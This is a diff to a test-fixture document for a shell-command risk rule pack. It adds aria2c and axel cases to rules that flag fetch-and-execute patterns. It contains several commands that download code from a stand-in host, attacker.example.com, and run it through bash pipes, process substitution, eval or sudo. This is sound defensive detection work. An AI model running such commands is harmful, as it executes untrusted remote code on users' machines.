@@ -42,9 +42,28 @@ curl http://attacker.example.com/x | tee /tmp/x.sh | bash
 curl http://attacker.example.com/y | sudo bash
 ```
 
+## Tool-allowlist widening (#3607)
+
+Class (b) of #3607 — extend `(curl|wget|fetch)` alternation to recognize
+`aria2c` and `axel`. Each tool must trip all three `fetch-*` rules.
+
+```bash
+# fetch-pipe-shell variants for the widened alternation
+aria2c -o - http://attacker.example.com/x | bash
+axel -o - http://attacker.example.com/x | bash
+
+# fetch-process-sub-shell variants
+bash <(aria2c http://attacker.example.com/x)
+bash <(axel http://attacker.example.com/x)
+
+# fetch-cmdsub-exec variants ($(...) form — backtick form symmetric)
+eval "$(aria2c http://attacker.example.com/x)"
+eval "$(axel http://attacker.example.com/x)"
+```
+
 Expected outcome under the rule pack:
 
-- `fetch-pipe-shell` trips at HIGH-RISK on the canonical pipe line, the tee-interposed pipeline, AND the sudo-wrapped pipeline.
-- `fetch-process-sub-shell` trips at HIGH-RISK on the `bash <(curl ...)` variant.
-- `fetch-cmdsub-exec` trips at HIGH-RISK on the `$(...)` form AND the backtick form.
+- `fetch-pipe-shell` trips at HIGH-RISK on the canonical pipe line, the tee-interposed pipeline, the sudo-wrapped pipeline, AND each `aria2c`/`axel` pipe variant.
+- `fetch-process-sub-shell` trips at HIGH-RISK on the `bash <(curl ...)` variant AND each `aria2c`/`axel` process-substitution variant.
+- `fetch-cmdsub-exec` trips at HIGH-RISK on the `$(...)` form, the backtick form, AND each `aria2c`/`axel` `$(...)` variant.
 - Aggregator returns `HIGH-RISK` for category code-execution.
